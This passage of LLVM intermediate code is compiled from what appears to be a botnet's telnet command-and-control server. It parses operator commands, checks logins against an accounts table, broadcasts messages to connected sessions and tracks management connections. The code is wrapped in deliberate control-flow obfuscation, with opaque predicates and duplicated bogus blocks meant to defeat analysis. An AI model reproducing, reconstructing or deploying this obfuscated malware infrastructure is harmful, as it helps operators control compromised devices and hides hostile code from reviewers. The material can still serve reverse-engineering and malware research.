  br i1 %3845, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %3837
  %3846 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3847 = call i8* @strstr(i8* %3846, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0)) #8
  %3848 = icmp ne i8* %3847, null
  %3849 = load i32, i32* @x.17
  %3850 = load i32, i32* @y.18
  %3851 = sub i32 %3849, 1
  %3852 = mul i32 %3849, %3851
  %3853 = urem i32 %3852, 2
  %3854 = icmp eq i32 %3853, 0
  %3855 = icmp slt i32 %3850, 10
  %3856 = or i1 %3854, %3855
  br i1 %3856, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br i1 %3848, label %3857, label %3884

; <label>:3857:                                   ; preds = %originalBBpart2472
  %3858 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3859 = call i32 (i8*, i8*, ...) @sprintf(i8* %3858, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i32 0, i32 0)) #7
  %3860 = load i32, i32* %4, align 4
  %3861 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3863 = call i64 @strlen(i8* %3862) #8
  %3864 = call i64 @send(i32 %3860, i8* %3861, i64 %3863, i32 16384)
  %3865 = icmp eq i64 %3864, -1
  br i1 %3865, label %3866, label %3867

; <label>:3866:                                   ; preds = %3857
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3867:                                   ; preds = %3857
  %3868 = load i32, i32* @x.17
  %3869 = load i32, i32* @y.18
  %3870 = sub i32 %3868, 1
  %3871 = mul i32 %3868, %3870
  %3872 = urem i32 %3871, 2
  %3873 = icmp eq i32 %3872, 0
  %3874 = icmp slt i32 %3869, 10
  %3875 = or i1 %3873, %3874
  br i1 %3875, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %3867
  %3876 = load i32, i32* @x.17
  %3877 = load i32, i32* @y.18
  %3878 = sub i32 %3876, 1
  %3879 = mul i32 %3876, %3878
  %3880 = urem i32 %3879, 2
  %3881 = icmp eq i32 %3880, 0
  %3882 = icmp slt i32 %3877, 10
  %3883 = or i1 %3881, %3882
  br i1 %3883, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br label %3884

; <label>:3884:                                   ; preds = %originalBBpart2476, %originalBBpart2472
  %3885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3886 = call i8* @strstr(i8* %3885, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i32 0, i32 0)) #8
  %3887 = icmp ne i8* %3886, null
  br i1 %3887, label %3888, label %3931

; <label>:3888:                                   ; preds = %3884
  %3889 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3890 = call i32 (i8*, i8*, ...) @sprintf(i8* %3889, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i32 0, i32 0)) #7
  %3891 = load i32, i32* %4, align 4
  %3892 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3893 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3894 = call i64 @strlen(i8* %3893) #8
  %3895 = call i64 @send(i32 %3891, i8* %3892, i64 %3894, i32 16384)
  %3896 = icmp eq i64 %3895, -1
  br i1 %3896, label %3897, label %3914

; <label>:3897:                                   ; preds = %3888
  %3898 = load i32, i32* @x.17
  %3899 = load i32, i32* @y.18
  %3900 = sub i32 %3898, 1
  %3901 = mul i32 %3898, %3900
  %3902 = urem i32 %3901, 2
  %3903 = icmp eq i32 %3902, 0
  %3904 = icmp slt i32 %3899, 10
  %3905 = or i1 %3903, %3904
  br i1 %3905, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %3897
  store i8* null, i8** %2, align 8
  %3906 = load i32, i32* @x.17
  %3907 = load i32, i32* @y.18
  %3908 = sub i32 %3906, 1
  %3909 = mul i32 %3906, %3908
  %3910 = urem i32 %3909, 2
  %3911 = icmp eq i32 %3910, 0
  %3912 = icmp slt i32 %3907, 10
  %3913 = or i1 %3911, %3912
  br i1 %3913, label %originalBBpart2480, label %originalBB478alteredBB

originalBBpart2480:                               ; preds = %originalBB478
  br label %4206

; <label>:3914:                                   ; preds = %3888
  %3915 = load i32, i32* @x.17
  %3916 = load i32, i32* @y.18
  %3917 = sub i32 %3915, 1
  %3918 = mul i32 %3915, %3917
  %3919 = urem i32 %3918, 2
  %3920 = icmp eq i32 %3919, 0
  %3921 = icmp slt i32 %3916, 10
  %3922 = or i1 %3920, %3921
  br i1 %3922, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %3914
  %3923 = load i32, i32* @x.17
  %3924 = load i32, i32* @y.18
  %3925 = sub i32 %3923, 1
  %3926 = mul i32 %3923, %3925
  %3927 = urem i32 %3926, 2
  %3928 = icmp eq i32 %3927, 0
  %3929 = icmp slt i32 %3924, 10
  %3930 = or i1 %3928, %3929
  br i1 %3930, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br label %3931

; <label>:3931:                                   ; preds = %originalBBpart2484, %3884
  %3932 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3933 = call i8* @strstr(i8* %3932, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0)) #8
  %3934 = icmp ne i8* %3933, null
  br i1 %3934, label %3935, label %3978

; <label>:3935:                                   ; preds = %3931
  %3936 = load i32, i32* @x.17
  %3937 = load i32, i32* @y.18
  %3938 = sub i32 %3936, 1
  %3939 = mul i32 %3936, %3938
  %3940 = urem i32 %3939, 2
  %3941 = icmp eq i32 %3940, 0
  %3942 = icmp slt i32 %3937, 10
  %3943 = or i1 %3941, %3942
  br i1 %3943, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %3935
  %3944 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3945 = call i32 (i8*, i8*, ...) @sprintf(i8* %3944, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i32 0, i32 0)) #7
  %3946 = load i32, i32* %4, align 4
  %3947 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3948 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3949 = call i64 @strlen(i8* %3948) #8
  %3950 = call i64 @send(i32 %3946, i8* %3947, i64 %3949, i32 16384)
  %3951 = icmp eq i64 %3950, -1
  %3952 = load i32, i32* @x.17
  %3953 = load i32, i32* @y.18
  %3954 = sub i32 %3952, 1
  %3955 = mul i32 %3952, %3954
  %3956 = urem i32 %3955, 2
  %3957 = icmp eq i32 %3956, 0
  %3958 = icmp slt i32 %3953, 10
  %3959 = or i1 %3957, %3958
  br i1 %3959, label %originalBBpart2488, label %originalBB486alteredBB

originalBBpart2488:                               ; preds = %originalBB486
  br i1 %3951, label %3960, label %3977

; <label>:3960:                                   ; preds = %originalBBpart2488
  %3961 = load i32, i32* @x.17
  %3962 = load i32, i32* @y.18
  %3963 = sub i32 %3961, 1
  %3964 = mul i32 %3961, %3963
  %3965 = urem i32 %3964, 2
  %3966 = icmp eq i32 %3965, 0
  %3967 = icmp slt i32 %3962, 10
  %3968 = or i1 %3966, %3967
  br i1 %3968, label %originalBB490, label %originalBB490alteredBB

originalBB490:                                    ; preds = %originalBB490alteredBB, %3960
  store i8* null, i8** %2, align 8
  %3969 = load i32, i32* @x.17
  %3970 = load i32, i32* @y.18
  %3971 = sub i32 %3969, 1
  %3972 = mul i32 %3969, %3971
  %3973 = urem i32 %3972, 2
  %3974 = icmp eq i32 %3973, 0
  %3975 = icmp slt i32 %3970, 10
  %3976 = or i1 %3974, %3975
  br i1 %3976, label %originalBBpart2492, label %originalBB490alteredBB

originalBBpart2492:                               ; preds = %originalBB490
  br label %4206

; <label>:3977:                                   ; preds = %originalBBpart2488
  br label %3978

; <label>:3978:                                   ; preds = %3977, %3931
  %3979 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3980 = call i8* @strstr(i8* %3979, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0)) #8
  %3981 = icmp ne i8* %3980, null
  br i1 %3981, label %3982, label %4025

; <label>:3982:                                   ; preds = %3978
  %3983 = load i32, i32* @x.17
  %3984 = load i32, i32* @y.18
  %3985 = sub i32 %3983, 1
  %3986 = mul i32 %3983, %3985
  %3987 = urem i32 %3986, 2
  %3988 = icmp eq i32 %3987, 0
  %3989 = icmp slt i32 %3984, 10
  %3990 = or i1 %3988, %3989
  br i1 %3990, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3982
  %3991 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3992 = call i32 (i8*, i8*, ...) @sprintf(i8* %3991, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i32 0, i32 0)) #7
  %3993 = load i32, i32* %4, align 4
  %3994 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3996 = call i64 @strlen(i8* %3995) #8
  %3997 = call i64 @send(i32 %3993, i8* %3994, i64 %3996, i32 16384)
  %3998 = icmp eq i64 %3997, -1
  %3999 = load i32, i32* @x.17
  %4000 = load i32, i32* @y.18
  %4001 = sub i32 %3999, 1
  %4002 = mul i32 %3999, %4001
  %4003 = urem i32 %4002, 2
  %4004 = icmp eq i32 %4003, 0
  %4005 = icmp slt i32 %4000, 10
  %4006 = or i1 %4004, %4005
  br i1 %4006, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3998, label %4007, label %4024

; <label>:4007:                                   ; preds = %originalBBpart2496
  %4008 = load i32, i32* @x.17
  %4009 = load i32, i32* @y.18
  %4010 = sub i32 %4008, 1
  %4011 = mul i32 %4008, %4010
  %4012 = urem i32 %4011, 2
  %4013 = icmp eq i32 %4012, 0
  %4014 = icmp slt i32 %4009, 10
  %4015 = or i1 %4013, %4014
  br i1 %4015, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %4007
  store i8* null, i8** %2, align 8
  %4016 = load i32, i32* @x.17
  %4017 = load i32, i32* @y.18
  %4018 = sub i32 %4016, 1
  %4019 = mul i32 %4016, %4018
  %4020 = urem i32 %4019, 2
  %4021 = icmp eq i32 %4020, 0
  %4022 = icmp slt i32 %4017, 10
  %4023 = or i1 %4021, %4022
  br i1 %4023, label %originalBBpart2500, label %originalBB498alteredBB

originalBBpart2500:                               ; preds = %originalBB498
  br label %4206

; <label>:4024:                                   ; preds = %originalBBpart2496
  br label %4025

; <label>:4025:                                   ; preds = %4024, %3978
  %4026 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4027 = call i8* @strstr(i8* %4026, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i32 0, i32 0)) #8
  %4028 = icmp ne i8* %4027, null
  br i1 %4028, label %4029, label %4030

; <label>:4029:                                   ; preds = %4025
  br label %393

; <label>:4030:                                   ; preds = %4025
  %4031 = load i32, i32* @x.17
  %4032 = load i32, i32* @y.18
  %4033 = sub i32 %4031, 1
  %4034 = mul i32 %4031, %4033
  %4035 = urem i32 %4034, 2
  %4036 = icmp eq i32 %4035, 0
  %4037 = icmp slt i32 %4032, 10
  %4038 = or i1 %4036, %4037
  br i1 %4038, label %originalBB502, label %originalBB502alteredBB

originalBB502:                                    ; preds = %originalBB502alteredBB, %4030
  %4039 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4040 = call i8* @strstr(i8* %4039, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i32 0, i32 0)) #8
  %4041 = icmp ne i8* %4040, null
  %4042 = load i32, i32* @x.17
  %4043 = load i32, i32* @y.18
  %4044 = sub i32 %4042, 1
  %4045 = mul i32 %4042, %4044
  %4046 = urem i32 %4045, 2
  %4047 = icmp eq i32 %4046, 0
  %4048 = icmp slt i32 %4043, 10
  %4049 = or i1 %4047, %4048
  br i1 %4049, label %originalBBpart2504, label %originalBB502alteredBB

originalBBpart2504:                               ; preds = %originalBB502
  br i1 %4041, label %4050, label %4051

; <label>:4050:                                   ; preds = %originalBBpart2504
  br label %393

; <label>:4051:                                   ; preds = %originalBBpart2504
  %4052 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4053 = call i8* @strstr(i8* %4052, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i32 0, i32 0)) #8
  %4054 = icmp ne i8* %4053, null
  br i1 %4054, label %4055, label %4056

; <label>:4055:                                   ; preds = %4051
  br label %393

; <label>:4056:                                   ; preds = %4051
  %4057 = load i32, i32* @x.17
  %4058 = load i32, i32* @y.18
  %4059 = sub i32 %4057, 1
  %4060 = mul i32 %4057, %4059
  %4061 = urem i32 %4060, 2
  %4062 = icmp eq i32 %4061, 0
  %4063 = icmp slt i32 %4058, 10
  %4064 = or i1 %4062, %4063
  br i1 %4064, label %originalBB506, label %originalBB506alteredBB

originalBB506:                                    ; preds = %originalBB506alteredBB, %4056
  %4065 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4066 = call i8* @strstr(i8* %4065, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i32 0, i32 0)) #8
  %4067 = icmp ne i8* %4066, null
  %4068 = load i32, i32* @x.17
  %4069 = load i32, i32* @y.18
  %4070 = sub i32 %4068, 1
  %4071 = mul i32 %4068, %4070
  %4072 = urem i32 %4071, 2
  %4073 = icmp eq i32 %4072, 0
  %4074 = icmp slt i32 %4069, 10
  %4075 = or i1 %4073, %4074
  br i1 %4075, label %originalBBpart2508, label %originalBB506alteredBB

originalBBpart2508:                               ; preds = %originalBB506
  br i1 %4067, label %4076, label %4077

; <label>:4076:                                   ; preds = %originalBBpart2508
  br label %393

; <label>:4077:                                   ; preds = %originalBBpart2508
  %4078 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4079 = call i8* @strstr(i8* %4078, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i32 0, i32 0)) #8
  %4080 = icmp ne i8* %4079, null
  br i1 %4080, label %4081, label %4082

; <label>:4081:                                   ; preds = %4077
  br label %4181

; <label>:4082:                                   ; preds = %4077
  %4083 = load i32, i32* @x.17
  %4084 = load i32, i32* @y.18
  %4085 = sub i32 %4083, 1
  %4086 = mul i32 %4083, %4085
  %4087 = urem i32 %4086, 2
  %4088 = icmp eq i32 %4087, 0
  %4089 = icmp slt i32 %4084, 10
  %4090 = or i1 %4088, %4089
  br i1 %4090, label %originalBB510, label %originalBB510alteredBB

originalBB510:                                    ; preds = %originalBB510alteredBB, %4082
  %4091 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4092 = call i8* @strstr(i8* %4091, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i32 0, i32 0)) #8
  %4093 = icmp ne i8* %4092, null
  %4094 = load i32, i32* @x.17
  %4095 = load i32, i32* @y.18
  %4096 = sub i32 %4094, 1
  %4097 = mul i32 %4094, %4096
  %4098 = urem i32 %4097, 2
  %4099 = icmp eq i32 %4098, 0
  %4100 = icmp slt i32 %4095, 10
  %4101 = or i1 %4099, %4100
  br i1 %4101, label %originalBBpart2512, label %originalBB510alteredBB

originalBBpart2512:                               ; preds = %originalBB510
  br i1 %4093, label %4102, label %4103

; <label>:4102:                                   ; preds = %originalBBpart2512
  br label %4181

; <label>:4103:                                   ; preds = %originalBBpart2512
  %4104 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %4104)
  %4105 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4106 = load i32, i32* %5, align 4
  %4107 = sext i32 %4106 to i64
  %4108 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4107
  %4109 = getelementptr inbounds %struct.account, %struct.account* %4108, i32 0, i32 0
  %4110 = getelementptr inbounds [20 x i8], [20 x i8]* %4109, i32 0, i32 0
  %4111 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4112 = call i32 (i8*, i8*, ...) @sprintf(i8* %4105, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %4110, i8* %4111) #7
  %4113 = load i32, i32* %4, align 4
  %4114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4116 = call i64 @strlen(i8* %4115) #8
  %4117 = call i64 @send(i32 %4113, i8* %4114, i64 %4116, i32 16384)
  %4118 = icmp eq i64 %4117, -1
  br i1 %4118, label %4119, label %4120

; <label>:4119:                                   ; preds = %4103
  br label %4181

; <label>:4120:                                   ; preds = %4103
  %4121 = load i32, i32* @x.17
  %4122 = load i32, i32* @y.18
  %4123 = sub i32 %4121, 1
  %4124 = mul i32 %4121, %4123
  %4125 = urem i32 %4124, 2
  %4126 = icmp eq i32 %4125, 0
  %4127 = icmp slt i32 %4122, 10
  %4128 = or i1 %4126, %4127
  br i1 %4128, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %4120
  %4129 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4130 = call i64 @strlen(i8* %4129) #8
  %4131 = icmp eq i64 %4130, 0
  %4132 = load i32, i32* @x.17
  %4133 = load i32, i32* @y.18
  %4134 = sub i32 %4132, 1
  %4135 = mul i32 %4132, %4134
  %4136 = urem i32 %4135, 2
  %4137 = icmp eq i32 %4136, 0
  %4138 = icmp slt i32 %4133, 10
  %4139 = or i1 %4137, %4138
  br i1 %4139, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %4131, label %4140, label %4157

; <label>:4140:                                   ; preds = %originalBBpart2516
  %4141 = load i32, i32* @x.17
  %4142 = load i32, i32* @y.18
  %4143 = sub i32 %4141, 1
  %4144 = mul i32 %4141, %4143
  %4145 = urem i32 %4144, 2
  %4146 = icmp eq i32 %4145, 0
  %4147 = icmp slt i32 %4142, 10
  %4148 = or i1 %4146, %4147
  br i1 %4148, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %4140
  %4149 = load i32, i32* @x.17
  %4150 = load i32, i32* @y.18
  %4151 = sub i32 %4149, 1
  %4152 = mul i32 %4149, %4151
  %4153 = urem i32 %4152, 2
  %4154 = icmp eq i32 %4153, 0
  %4155 = icmp slt i32 %4150, 10
  %4156 = or i1 %4154, %4155
  br i1 %4156, label %originalBBpart2520, label %originalBB518alteredBB

originalBBpart2520:                               ; preds = %originalBB518
  br label %561

; <label>:4157:                                   ; preds = %originalBBpart2516
  %4158 = load i32, i32* %5, align 4
  %4159 = sext i32 %4158 to i64
  %4160 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4159
  %4161 = getelementptr inbounds %struct.account, %struct.account* %4160, i32 0, i32 0
  %4162 = getelementptr inbounds [20 x i8], [20 x i8]* %4161, i32 0, i32 0
  %4163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %4162, i8* %4163)
  %4165 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %4165, %struct._IO_FILE** %111, align 8
  %4166 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %4167 = load i32, i32* %5, align 4
  %4168 = sext i32 %4167 to i64
  %4169 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4168
  %4170 = getelementptr inbounds %struct.account, %struct.account* %4169, i32 0, i32 0
  %4171 = getelementptr inbounds [20 x i8], [20 x i8]* %4170, i32 0, i32 0
  %4172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4173 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %4166, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %4171, i8* %4172)
  %4174 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %4175 = call i32 @fclose(%struct._IO_FILE* %4174)
  %4176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4177 = load i32, i32* %4, align 4
  %4178 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %4176, i32 %4177, i8* %4178)
  %4179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4179, i8 0, i64 2048, i32 16, i1 false)
  br label %561

; <label>:4180:                                   ; preds = %561
  br label %4181

; <label>:4181:                                   ; preds = %4180, %4119, %4102, %4081, %2744, %2717, %originalBBpart2324, %2655, %originalBBpart2316, %2596, %2588, %2580, %2556, %2548, %2540, %originalBBpart2304, %2436, %originalBBpart2296, %2393, %2385, %2377, %2369, %2361, %originalBBpart2292, %originalBBpart2288, %2289, %2281, %2257, %originalBBpart2276, %2209, %originalBBpart2268, %2177, %2169, %originalBBpart2264, %originalBBpart2256, %originalBBpart2252, %originalBBpart2244, %2033, %originalBBpart2240, %1985, %1867, %originalBBpart2220, %1824, %1816, %originalBBpart2216, %1784, %1694, %1675, %originalBBpart2196, %1611, %1603, %originalBBpart2188, %1571, %1563, %originalBBpart2180, %originalBBpart2176, %1475, %1467, %originalBBpart2168, %1361, %1342, %originalBBpart2156, %1310, %originalBBpart2152, %1262, %1254, %1230, %1206, %1146, %originalBBpart2128, %originalBBpart2120, %1047, %1039, %1031, %originalBBpart2116, %999, %895, %876, %868, %originalBBpart296, %836, %originalBBpart288, %788, %originalBBpart284, %756, %748, %originalBBpart276, %700, %552, %535, %originalBBpart256, %originalBBpart248, %originalBBpart244, %originalBBpart240, %399, %391, %390, %382, %374, %310, %originalBBpart224, %originalBBpart220, %224, %214
  %4182 = load i32, i32* @x.17
  %4183 = load i32, i32* @y.18
  %4184 = sub i32 %4182, 1
  %4185 = mul i32 %4182, %4184
  %4186 = urem i32 %4185, 2
  %4187 = icmp eq i32 %4186, 0
  %4188 = icmp slt i32 %4183, 10
  %4189 = or i1 %4187, %4188
  br i1 %4189, label %originalBB522, label %originalBB522alteredBB

originalBB522:                                    ; preds = %originalBB522alteredBB, %4181
  %4190 = load i32, i32* %4, align 4
  %4191 = sext i32 %4190 to i64
  %4192 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %4191
  %4193 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %4192, i32 0, i32 1
  store i32 0, i32* %4193, align 4
  %4194 = load i32, i32* %4, align 4
  %4195 = call i32 @close(i32 %4194)
  %4196 = load volatile i32, i32* @managesConnected, align 4
  %4197 = add nsw i32 %4196, -1
  store volatile i32 %4197, i32* @managesConnected, align 4
  %4198 = load i32, i32* @x.17
  %4199 = load i32, i32* @y.18
  %4200 = sub i32 %4198, 1
  %4201 = mul i32 %4198, %4200
  %4202 = urem i32 %4201, 2
  %4203 = icmp eq i32 %4202, 0
  %4204 = icmp slt i32 %4199, 10
  %4205 = or i1 %4203, %4204
  br i1 %4205, label %originalBBpart2530, label %originalBB522alteredBB

originalBBpart2530:                               ; preds = %originalBB522
  br label %4206

; <label>:4206:                                   ; preds = %originalBBpart2530, %originalBBpart2500, %originalBBpart2492, %originalBBpart2480, %3866, %3835, %3804, %3773, %originalBBpart2452, %3695, %originalBBpart2448, %3633, %3598, %3567, %3536, %3489, %originalBBpart2424, %originalBBpart2408, %3348, %3317, %3270, %3255, %3208, %3193, %3178, %3131, %originalBBpart2372, %3041, %2960, %originalBBpart2348, %originalBBpart2344, %2796
  %4207 = load i32, i32* @x.17
  %4208 = load i32, i32* @y.18
  %4209 = sub i32 %4207, 1
  %4210 = mul i32 %4207, %4209
  %4211 = urem i32 %4210, 2
  %4212 = icmp eq i32 %4211, 0
  %4213 = icmp slt i32 %4208, 10
  %4214 = or i1 %4212, %4213
  br i1 %4214, label %originalBB532, label %originalBB532alteredBB

originalBB532:                                    ; preds = %originalBB532alteredBB, %4206
  %4215 = load i8*, i8** %2, align 8
  %4216 = load i32, i32* @x.17
  %4217 = load i32, i32* @y.18
  %4218 = sub i32 %4216, 1
  %4219 = mul i32 %4216, %4218
  %4220 = urem i32 %4219, 2
  %4221 = icmp eq i32 %4220, 0
  %4222 = icmp slt i32 %4217, 10
  %4223 = or i1 %4221, %4222
  br i1 %4223, label %originalBBpart2534, label %originalBB532alteredBB

originalBBpart2534:                               ; preds = %originalBB532
  ret i8* %4215

originalBBalteredBB:                              ; preds = %originalBB, %120
  %4224 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %4225 = call i32 @feof(%struct._IO_FILE* %4224) #7
  %4226 = icmp ne i32 %4225, 0
  %_ = shl i1 %4226, true
  %_1 = sub i1 %4226, true
  %gen = mul i1 %_1, true
  %4227 = xor i1 %4226, true
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %148
  %4228 = load i32, i32* %17, align 4
  %4229 = load i32, i32* %15, align 4
  %_3 = sub i32 %4229, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %4229, 1
  %gen6 = mul i32 %_5, 1
  %4230 = sub nsw i32 %4229, 1
  %4231 = icmp ne i32 %4228, %4230
  br label %originalBB2

originalBB10alteredBB:                            ; preds = %originalBB10, %189
  %4232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4233 = call i32 (i8*, i8*, ...) @sprintf(i8* %4232, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0)) #7
  %4234 = load i32, i32* %4, align 4
  %4235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4237 = call i64 @strlen(i8* %4236) #8
  %4238 = call i64 @send(i32 %4234, i8* %4235, i64 %4237, i32 16384)
  %4239 = icmp eq i64 %4238, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %225
  %4240 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4241 = load i32, i32* %4, align 4
  %4242 = call i32 @fdgets(i8* %4240, i32 2048, i32 %4241)
  %4243 = icmp slt i32 %4242, 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %246
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %288
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %311
  %4244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %4244)
  %4245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4246 = load i32, i32* %5, align 4
  %4247 = sext i32 %4246 to i64
  %4248 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4247
  %4249 = getelementptr inbounds %struct.account, %struct.account* %4248, i32 0, i32 1
  %4250 = getelementptr inbounds [20 x i8], [20 x i8]* %4249, i32 0, i32 0
  %4251 = call i32 @strcmp(i8* %4245, i8* %4250) #8
  %4252 = icmp ne i32 %4251, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %337
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %400
  %4253 = load i32, i32* %4, align 4
  %4254 = call i64 @send(i32 %4253, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i64 2, i32 16384)
  %4255 = icmp eq i64 %4254, -1
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %420
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %447
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %471
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %488
  %4256 = load i32, i32* %4, align 4
  %4257 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %4258 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %4259 = call i64 @strlen(i8* %4258) #8
  %4260 = call i64 @send(i32 %4256, i8* %4257, i64 %4259, i32 16384)
  %4261 = icmp eq i64 %4260, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %511
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %593
  br label %originalBB58

